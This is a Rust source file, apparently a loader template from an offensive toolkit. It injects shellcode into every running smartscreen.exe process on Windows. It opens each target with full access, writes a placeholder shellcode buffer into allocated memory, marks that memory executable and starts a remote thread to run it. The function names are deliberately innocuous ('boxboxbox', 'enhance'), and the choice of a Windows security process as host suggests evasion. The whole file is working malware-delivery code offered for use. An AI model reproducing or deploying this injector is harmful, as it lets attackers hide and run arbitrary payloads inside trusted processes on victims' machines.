use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};

fn boxboxbox(tar: &str) -> Vec<u32> {
    // search for processes to inject into
    let mut dom: Vec<u32> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(pro.pid().as_u32());
    }
    return dom;
}

fn enhance(buf:&[u8], tar:&u32) {
    // injecting in target processes :)

    unsafe {
        let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
        let resultPtr = VirtualAllocEx(hProcess, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut byteswritten = 0;
        let _resb = WriteProcessMemory(hProcess, resultPtr, buf.as_ptr() as _, buf.len(), Some(&mut byteswritten));
        let mut old_perms = PAGE_EXECUTE_READ;
        let _bool = VirtualProtectEx(hProcess, resultPtr, buf.len(), PAGE_EXECUTE_READ, &mut old_perms,);
        let _resCRT = CreateRemoteThread(hProcess, None, 0, Some(std::mem::transmute(resultPtr)), None, 0, None).unwrap();
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "smartscreen.exe";

    let buf: Vec<u8> = vec!{{shellcode}};
    let list:Vec<u32> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    }
    else {
        for i in &list {
            enhance(&buf, i);
        }
    }
}